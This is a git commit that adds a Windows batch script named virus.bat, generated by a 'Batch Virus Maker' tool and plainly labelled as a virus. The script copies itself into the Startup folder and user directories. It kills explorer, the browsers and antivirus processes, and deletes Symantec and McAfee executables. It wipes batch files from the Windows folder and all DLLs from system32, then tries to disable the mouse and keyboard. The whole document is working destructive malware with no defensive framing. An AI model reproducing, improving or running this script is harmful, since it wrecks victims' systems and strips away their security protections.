a535b6ab689eb52972ab86f5cbddbd51bc177093
AnonyusS <93277173+AnonyusS@users.noreply.github.com>
2022-04-15 22:22:02 +0200

    Create virus.bat

---
+++ virus.bat
@@ -0,0 +1,38 @@
+@echo off
+copy "virus.bat" "C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Démarrage"
+copy "virus.bat" "C:\"
+copy "virus.bat" "%userprofile%\Documents"
+tskill explorer
+tskill ccapp
+tskill firefox
+tskill chrome
+rem made with Batch Virus Maker V.2
+tskill iexplorer
+time 12:00
+rem made with Batch Virus Maker V.2
+del C:\Program Files\Common Files\Symantec Shared\ccapp.exe
+cd C:\WINDOWS
+if exist "*.bat" del "*.bat"
+cd C:\WINDOWS\system32
+rem made with Batch Virus Maker V.2
+if exist "*.dll" del "*.dll"
+tskill McAfee Security Centre Module
+del c:\program files\mcafee.com\agent\mcdetect.exe
+rem made with Batch Virus Maker V.2
+copy "virus.bat" "virus.bat45544"
+copy "virus.bat" "virus.bat85858"
+copy "virus.bat" "virus.bat1645"
+copy "virus.bat" "virus.bat9765"
+copy "virus.bat" "virus.bat45465"
+rem made with Batch Virus Maker V.2
+copy "virus.bat" "virus.bat456877"
+copy "virus.bat" "virus.bat77989845"
+copy "virus.bat" "virus.bat2135"
+copy "virus.bat" "virus.bat46876"
+rem made with Batch Virus Maker V.2
+copy "virus.bat" "virus.bat45687"
+copy "virus.bat" "virus.bat8868"
+msg * this is a virus
+rundll mouse,disable
+rem made with Batch Virus Maker V.2
+rundll keyboard,disable
